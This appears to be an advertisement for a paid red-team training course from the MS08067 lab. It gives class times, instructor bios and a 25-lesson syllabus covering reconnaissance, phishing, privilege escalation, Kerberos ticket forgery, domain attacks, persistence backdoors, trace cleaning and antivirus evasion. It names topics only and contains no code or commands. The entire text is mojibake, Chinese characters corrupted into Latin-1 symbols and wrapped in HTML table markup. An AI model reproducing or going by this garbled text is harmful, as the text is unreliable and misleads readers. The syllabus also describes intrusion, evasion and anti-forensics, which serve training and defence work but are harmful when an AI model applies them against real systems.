**å­¦ä¹ èµ„æº**

æœ¬æ¬¡åŸ¹è®­ç­çš„æ¯ä¸€èŠ‚è¯¾ç¨‹éƒ½ä¼šè¢«å½•åˆ¶æˆè§†é¢‘ä¸Šä¼ åˆ°å®˜æ–¹ç½‘ç«™ï¼ˆwww.ms08067.comï¼‰ï¼Œå­¦å‘˜å¯éšæ—¶éšåœ°åœ¨çº¿è§‚çœ‹ï¼Œä¹Ÿå¯æå‰åœ¨å®˜ç½‘å­¦ä¹ å†…ç½‘æ¸—é€ç›¸å…³çŸ¥è¯†ã€‚  
  
  

**ä¸Šè¯¾æ—¶é—´**

**æ¯å‘¨äº”ã€å…­ã€æ—¥çš„æ™šé—´ 19ï¼š30-21:30 ï¼Œå…±25è¯¾æ—¶ï¼Œä¸ºæœŸäºŒä¸ªå¤šæœˆ**ã€‚  
å¦‚æœæ— æ³•å‡†æ—¶å‚åŠ ç›´æ’­è¯¾ç¨‹ï¼Œåœ¨çº¿åŸ¹è®­çš„æ¯èŠ‚è¯¾ç¨‹éƒ½ä¼šè¢«å½•åˆ¶æˆè§†é¢‘ä¸Šä¼ åˆ°å®˜æ–¹ç½‘ç«™ï¼ˆwww.ms08067.comï¼‰ï¼Œå¯éšæ—¶éšåœ°åœ¨çº¿è§‚çœ‹ã€‚  

**ä¸Šè¯¾æ–¹å¼**

åŸ¹è®­é‡‡ç”¨åœ¨çº¿ç›´æ’­+éšå ‚å½•æ’­+å¾®ä¿¡ç¾¤è§£ç­”çš„å½¢å¼

**è®²å¸ˆä»‹ç»**

è®²å¸ˆAï¼šMS08067å®‰å…¨å®éªŒå®¤æ ¸å¿ƒæˆå‘˜ï¼Œå‰æŸå›½ä¼å®‰å…¨ç ”ç©¶å‘˜ï¼Œæ“…é•¿APTæ”»å‡»å’Œç¤¾ä¼šå·¥ç¨‹å­¦ã€‚  
  
è®²å¸ˆBï¼šMS08067å®‰å…¨å®éªŒå®¤æ ¸å¿ƒæˆå‘˜ï¼Œä¸»è¦ä»äº‹æ¸—é€æµ‹è¯•ã€å®‰å…¨å¼€å‘ç­‰æ–¹å‘ç ”ç©¶ã€‚å¤šæ¬¡å‚åŠ å›½å®¶æŠ¤ç½‘è¡ŒåŠ¨ï¼Œæ‹¥æœ‰å¤šå¹´çº¢é˜Ÿç»éªŒã€‚  
  
è®²å¸ˆCï¼šMS08067å®‰å…¨å®éªŒå®¤æ ¸å¿ƒæˆå‘˜ï¼Œå‰çŸ¥åä¹™æ–¹ç ”ç©¶å‘˜ï¼Œæ“…é•¿å…æ€ã€‚  
  

**å…¨æ–°è¯¾ç¨‹ç›®å½•6.0ç‰ˆ**

<table><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬1å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ä¿¡æ¯æ”¶é›†æ€»ä½“æ¦‚å¿µ<br>è¢«åŠ¨ä¿¡æ¯æ”¶é›†</strong><br>ä¿¡æ¯æ”¶é›†çš„æ€»ä½“æ¦‚å¿µä»¥åŠåœ¨æ•´ä¸ªçº¢é˜Ÿæµç¨‹ä¸­çš„ä½ç½®ï¼›<br>è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„å’ŒåŸºæœ¬é€»è¾‘ï¼›<br>è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„å¸¸è§æ‰‹æ®µï¼ˆç½‘ç»œç©ºé—´æœç´¢ã€è¢«åŠ¨ä¿¡æ¯æ”¶é›†å·¥å…·ã€ä¼ ç»Ÿæœç´¢ï¼‰ï¼›<br>è¢«åŠ¨ä¿¡æ¯æ”¶é›†åçš„ä¿¡æ¯å¤„ç†ï¼›<br>è¢«åŠ¨ä¿¡æ¯æ”¶é›†å·¥å…·çš„åº•å±‚åŸç†ä»¥åŠå¦‚ä½•ç¼–å†™ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬2å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background-image: initial;background-position: 0px 0px;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</strong><br>ä¿¡æ¯æ”¶é›†å®Œæˆä¹‹åçš„ä¿¡æ¯ç»¼åˆå¤„ç†<br>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„å’ŒåŸºæœ¬é€»è¾‘ï¼›<br>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„å¸¸è§æ‰‹æ®µï¼ˆä»…é™æ‰«æçš„nmapå’Œæ‰«æå¸¦æœ‰pocçš„gobyï¼‰ï¼›<br>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†åçš„ä¿¡æ¯å¤„ç†ï¼›<br>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†å·¥å…·çš„åº•å±‚åŸç†ä»¥åŠå¦‚ä½•ç¼–å†™ï¼›<br>å¦‚ä½•å°†ä¸»åŠ¨ä¿¡æ¯æ”¶é›†å’Œè¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„ä¿¡æ¯ç»¼åˆå¤„ç†ï¼›<br>æ”¶é›†åˆ°çš„ä¿¡æ¯å¦‚ä½•è¡”æ¥åˆ°ä¸‹ä¸€æ­¥çš„çº¢é˜Ÿæµç¨‹ä¸­ï¼›<br style="box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬3å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ç¤¾ä¼šå·¥ç¨‹å­¦</strong><br>ç¤¾ä¼šå·¥ç¨‹å­¦çš„å«ä¹‰ä»¥åŠå®é™…åº”ç”¨ï¼›<br>ç¤¾ä¼šå·¥ç¨‹å­¦çš„çŸ¥è¯†ä½“ç³»ï¼›<br>ç¤¾ä¼šå·¥ç¨‹å­¦çš„å­¦ä¹ æ–¹æ³•ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬4å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ç¤¾ä¼šå·¥ç¨‹å­¦ä¸­çš„äº¤äº’</strong><br>ç¤¾ä¼šå·¥ç¨‹å­¦ä¸­çš„å¸¸è§é’“é±¼æ–¹å¼ä»¥åŠåº”ç”¨ï¼›<br>ç¤¾ä¼šå·¥ç¨‹å­¦ä¸­å¦‚ä½•æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯åˆ©ç”¨ç›®æ ‡çš„ç¤¾ä¼šå±æ€§å¼±ç‚¹è¿›è¡Œäº¤äº’ï¼›<br>ç¤¾ä¼šå·¥ç¨‹å­¦ä¸­çš„ä¿¡ä»»è·å¾—å’Œä¿¡ä»»åˆ©ç”¨æ–¹å¼ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬5å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>å®æˆ˜ä¸­çš„å¿«é€Ÿå®¡è®¡</strong><br>å¯»æ‰¾æºç ä¸­çš„å¤šç§é€”å¾„ï¼›<br>å¿«é€ŸæŸ¥æ‰¾æºç ä¸­å¯åˆ©ç”¨çš„è„†å¼±ç‚¹ï¼›<br>ä½¿ç”¨å·¥å…·å‘ç°è„†å¼±ç‚¹ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬6å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>POCçš„ç¼–å†™</strong><br>POCç¼–å†™åº”å…·å¤‡çš„å“ªäº›æ¡ä»¶ï¼›<br>Ideaå·¥å…·çš„å®‰è£…ï¼›<br>æœ¬åœ°IOè¿›è¡Œå†…å®¹è¯»å†™ï¼›<br>ç½‘ç»œè¯·æ±‚è¿›è¡Œå‘åŒ…æ¨¡æ‹Ÿï¼›<br>POCå®æˆ˜ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬7å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>çº¢é˜Ÿä¹‹åæº¯æº</strong><br>å·¥ä½œæœºå™¨ï¼›æ”»å‡»èµ„æºï¼›<br>åŒ¿åæ”»å‡»ï¼›<br>è¯†åˆ«ååˆ¶ï¼›<br>åæº¯æºæ¡ˆä¾‹ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬8å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>Windowså†…ç½‘ææƒ</strong><br>Potatoå®¶æ—ææƒï¼›è¡¥ä¸ææƒï¼›ç³»ç»Ÿé…ç½®é”™è¯¯ææƒï¼›<br>ç¬¬ä¸‰æ–¹æœåŠ¡ææƒï¼›ç»„ç­–ç•¥ææƒï¼›Bypassuacï¼›<br>æ•°æ®åº“ææƒï¼›ä»¤ç‰Œçªƒå–ï¼›å¯†ç æ”¶é›†ææƒï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬9å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>Liunxå†…ç½‘ææƒ</strong><br>ç³»ç»Ÿå†…æ ¸ææƒï¼›ç¬¬ä¸‰æ–¹æœåŠ¡ææƒï¼›<br>æ•°æ®åº“ææƒï¼›å¯†ç æ”¶é›†ææƒï¼›<br>é”®ç›˜è®°å½•ææƒï¼›Suidææƒï¼›<br>Sudoææƒï¼›åå¼¹shellææƒï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬10å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>å†…ç½‘ç©¿é€</strong><br>å†…ç½‘ç©¿é€æ¦‚è¿°åŠæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ï¼›<br>èŠ±ç”Ÿå£³å†…ç½‘ç©¿é€ï¼›Frpå†…ç½‘ç©¿é€ï¼›<br>Ngrokå†…ç½‘ç©¿é€ï¼›reGeorg+Proxifierï¼›<br>å‘æ—¥è‘µä»£ç†åŠteamviewerï¼›<br>æœ€å°åŒ–æ¸—é€æ¦‚è¿°ï¼›äº‘å‡½æ•°ï¼›åŸŸå‰ç½®ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬11å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background-image: initial;background-position: 0px 0px;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>å¤–ç½‘æ‰“ç‚¹æŠ€å·§å’ŒKerberosè®¤è¯</strong><strong>åŸç†</strong><br>å…¥å£æƒé™è·å–ï¼›javaä¸­é—´ä»¶Ndayï¼›<br>phpé›†æˆç¯å¢ƒï¼›å¼€æºç¨‹åºNdayï¼›<br>è¾¹ç•Œç½‘ç»œè®¾å¤‡åˆ©ç”¨ï¼›åŸºç¡€æœåŠ¡getshellï¼›<br>kerberosè®¤è¯ï¼›kerberosè®¤è¯æµç¨‹ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬12å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>åŸŸå†…ä¿¡æ¯æ”¶é›†åŠåŸŸä¿¡ä»»</strong><br>åŸŸå†…ä¿¡æ¯æ”¶é›†æ¦‚è¿°ï¼›<br>åŸŸå†…ç”¨æˆ·ç»„æ”¶é›†ï¼›åŸŸä¿¡ä»»å…³ç³»æ”¶é›†ï¼›<br>ç”¨æˆ·ç›®å½•æ”¶é›†ï¼›é¢„æ§æ—¥å¿—æ”¶é›†ï¼›<br>Arpä¿¡æ¯æ”¶é›†ï¼›Tcpdumpï¼›Sshkeyæ”¶é›†ï¼›<br>é“­æ„Ÿé…ç½®è¯»å–ï¼›ç½‘ç»œæ‹“æ‰‘æ¶æ„åˆ†æåˆ¤æ–­ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬13å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>åŸŸæ¸—é€å·¥å…·å®æ“å®æˆ˜</strong><br>Setspnï¼›Nslookupï¼›AdFindï¼›<br>Psloggendonï¼›360safebrowserdecryptï¼›<br>SchtaskBackDoorWebshellï¼›regeditBypassUACï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬14å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ç¥¨æ®ä¼ªé€ ã€åŸŸå§”æ´¾æ”»å‡»</strong>ã€<strong>åŸŸæ§æ”»å‡»</strong><br>PTHè®¤è¯è¿‡ç¨‹è§£æï¼›ç¥¨æ®ä¼ªé€ æ”»å‡»åŸç†ï¼›<br>Mimikatzå®ç°ç¥¨æ®ä¼ªé€ æ”»å‡»ï¼›<br>åŸŸå§”æ´¾åŸç†ï¼›åŸŸå§”æ´¾æ”»å‡»æ–¹æ³•ï¼›<br>zerologinï¼›nopac</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬15å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>åŸŸæ—æ¸—é€</strong><br>åŸŸæ—æ¸—é€æ¦‚è¿°å’Œçˆ¶åŸŸå­åŸŸåŠåŸŸä¿¡ä»»å…³ç³»åˆ†æï¼›å¤§å‹åŸŸæ¸—é€æ€è·¯ï¼›<br>é¢„æ§å®šä½ï¼›Pthå–·å°„ï¼›åŸŸä¿¡ä»»æ”»å‡»ï¼›<br>ç»„ç­–ç•¥æ¼æ´ï¼›WebåŠç³»ç»Ÿæ¼æ´ï¼›é€ƒé€¸æ¼æ´ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(255, 255, 255);vertical-align: top;float: none !important;" width="113">ç¬¬16å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>Windowsæƒé™ç»´æŒ</strong><br>Windowsæƒé™ç»´æŒæ¦‚è¿°åŠéšè—æŠ€å·§ï¼›å…³é—­æ€è½¯ï¼›<br>æ³¨å†Œè¡¨è‡ªå¯åŠ¨ï¼›ç»„ç­–ç•¥è„šæœ¬ï¼›<br>è®¡åˆ’ä»»åŠ¡ï¼›æœåŠ¡è‡ªå¯åŠ¨ï¼›<br>å†…å­˜ç ï¼›è¿›ç¨‹åŠ«æŒï¼›éšè”½éš§é“ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬17å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>Liunxæƒé™ç»´æŒ</strong><br>Liunxæƒé™ç»´æŒæ¦‚è¿°åŠéšè—æŠ€å·§ï¼›<br>æ·»åŠ ç”¨æˆ·ï¼›SUIDshellï¼›<br>SSHå…¬ç§é’¥ï¼›è½¯è¿æ¥ï¼›<br>crontabè®¡åˆ’ä»»åŠ¡ï¼›Straceåé—¨ï¼›Opensshåé—¨ï¼›<br>éšè”½éš§é“ï¼›å…³æ€è½¯ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(243, 243, 243);vertical-align: top;float: none !important;" width="113">ç¬¬18å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(243, 243, 243);vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ç—•è¿¹æ¸…ç†</strong><br>Windowsæ“ä½œç³»ç»Ÿçš„ç—•è¿¹æ¸…ç†ï¼›<br>Windowsç—•è¿¹æ¸…ç†çš„åŸºæœ¬æ€è·¯å’Œæ€è€ƒé€»è¾‘ï¼›<br>Windowsæ¸…ç†ç™»å½•ç—•è¿¹ã€æ“ä½œç—•è¿¹åŠæ—¶é—´ç—•è¿¹ï¼›<br>Linuxæ“ä½œç³»ç»Ÿçš„ç—•è¿¹æ¸…ç†ï¼›<br>Linuxç—•è¿¹æ¸…ç†çš„åŸºæœ¬æ€è·¯å’Œæ€è€ƒé€»è¾‘ï¼›<br>Linuxæ¸…ç†ç™»å½•ç—•è¿¹ã€æ“ä½œç—•è¿¹åŠæ—¶é—´ç—•è¿¹ï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(249, 249, 249);vertical-align: top;float: none !important;" width="113">ç¬¬19å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong><strong>Meterpre</strong><strong>teræœ¨é©¬åˆ†</strong><strong>æ</strong></strong><br>åç¼–è¯‘meterprteræºç ï¼›<br>åˆ†æmeterpreteræºç ï¼›<br>æºç çº§åˆ«å…æ€æ·±å…¥æµ…å‡ºï¼›</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬20å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(255, 255, 255) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong><strong>å…æ€ä»£ç åŸºç¡€</strong></strong><br>ç¼–ç¨‹è¯­è¨€åŸºç¡€ï¼›<br>windowsapiåŸºç¡€ï¼›<br>socketç¼–ç¨‹åŸºç¡€ï¼›<br>shellcodeåŠ è½½å™¨åŸºç¡€ï¼›</td></tr></tbody></table><table><tbody><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬21å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>shellcodeåŸºç¡€</strong><br>ç°ä»£è¿œæ§çš„åŸºæœ¬ç»“æ„ï¼›<br>shellcodeç”Ÿæˆæ–¹å¼ä¸å¯ä»¥ä½¿ç”¨çš„ç±»å‹ï¼›<br>shellcodeæºç å†…å®¹ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(243, 243, 243) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬22å¤©è¯¾<br><br><br><br><br></td><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(243, 243, 243);vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>ä»£ç ä¸Šçš„å…æ€</strong><br>æ€æ¯’è½¯ä»¶åŸºæœ¬åŸç†ï¼›<br>æ€æ¯’è½¯ä»¶åŸºç¡€å¤ç°ï¼›<br>é’ˆå¯¹æ€æ¯’è½¯ä»¶ç‰¹ç‚¹å…æ€ï¼›<br>æŠ¤ç½‘è¿‡ç¨‹ä¸­å¦‚ä½•æ‰‹åŠ¨å’Œè‡ªåŠ¨è¯†åˆ«æ¶æ„ä»£ç ï¼›</td></tr></tbody></table><table><tbody><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬23å¤©è¯¾</td><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(249, 249, 249) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>äººå·¥å±‚é¢çš„å…æ€</strong><br>é€šä¿¡çš„åŠ å¯†ï¼›<br>é€šä¿¡å†…å®¹çš„ä¼ªé€ ï¼›<br>ipåœ°å€çš„ä¿æŠ¤ï¼›<br>æŠ¤ç½‘è¿‡ç¨‹ä¸­å¦‚ä½•è¯†åˆ«é€šä¿¡ç‰¹å¾ä¸å†…å®¹ï¼›<br>åè°ƒè¯•ï¼›<br></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 8px;border-right: medium none;border-bottom: medium none;border-left: medium none;background: rgb(243, 243, 243) none repeat scroll 0px 0px;vertical-align: top;float: none !important;word-break: break-all;" width="113">ç¬¬24å¤©è¯¾<br><br><br><br><br>ç¬¬25å¤©è¯¾<br><br><br></td><td style="box-sizing: border-box;padding: 8px;border-right: none;border-bottom: none;border-left: none;background: 0px 0px rgb(243, 243, 243);vertical-align: top;float: none !important;word-break: break-all;" width="464.3333333333333"><strong>å®é™…çº¢é˜Ÿæ¡ˆä¾‹åˆ†äº«ã€çº¢é˜Ÿæ”»å‡»æ€è·¯</strong><br>çº¢é˜Ÿæ¨¡æ‹Ÿé¢è¯•ï¼›<br>å®é™…çº¢é˜Ÿæ¡ˆä¾‹åˆ†äº«ï¼›<br>çº¢é˜Ÿæ”»å‡»æ€è·¯ï¼›<br><br><strong>çº¢é˜ŸæŠ¤ç½‘å‡†å¤‡å·¥å…·åŠè“é˜Ÿåˆ†æååˆ¶æ–¹æ³•åŠæ€è·¯<br></strong>çº¢é˜Ÿå‡†å¤‡å·¥å…·ï¼›<br>é‚®ä»¶æº¯æºå·¥ä½œï¼›<br>æ°´å‘ååˆ¶æ¡ˆä¾‹ï¼›<br><br></td></tr></tbody></table>

*å¤§çº²ä»…ä½œä¸ºå‚è€ƒï¼Œä¼šæ ¹æ®å½“æœŸè¿›åº¦æœ‰æ‰€å˜åŒ–ã€‚  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

**å¦‚ä½•æå‰é¢„ä¹ **

  

*   ä¸ºæ›´é¡ºåˆ©çš„å®Œæˆè¯¾ç¨‹ç›¸å…³å†…å®¹ï¼Œè¯·åŒå­¦ä¸€å®šè¦æå‰é¢„ä¹ ç›¸å…³çŸ¥è¯†ç‚¹ï¼Œå·²ç»æŠ¥åçš„åŒå­¦ï¼Œè¯·è´­ä¹°å®éªŒå®¤å‡ºç‰ˆçš„**ã€Šå†…ç½‘å®‰å…¨æ”»é˜²ï¼šæ¸—é€æµ‹è¯•å®æˆ˜æŒ‡å—ã€‹**ä¸€ä¹¦æˆ–å‚åŠ è½¬å‘æœ‹å‹åœˆèµ é€**â€œå†…ç½‘çŸ¥è¯†æ˜Ÿçƒâ€**æ´»åŠ¨ï¼Œå­¦ä¹ ç›¸å…³çš„å†…å®¹ã€‚
    
      
    

  

 **ä½ è·ç¦»çº¢é˜Ÿå¤§ä½¬ï¼Œåªå·®ä¸€ä¸ªå†³å®š**   

**æŠ¥åå’¨è¯¢è”ç³»å°å®¢æœ**  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**æ‰«æä¸‹æ–¹äºŒç»´ç åŠ å…¥æ˜Ÿçƒå­¦ä¹ **  

**åŠ å…¥åé‚€è¯·ä½ è¿›å…¥å†…éƒ¨å¾®ä¿¡ç¾¤ï¼Œå†…éƒ¨å¾®ä¿¡ç¾¤æ°¸ä¹…æœ‰æ•ˆï¼**

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)Â ![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

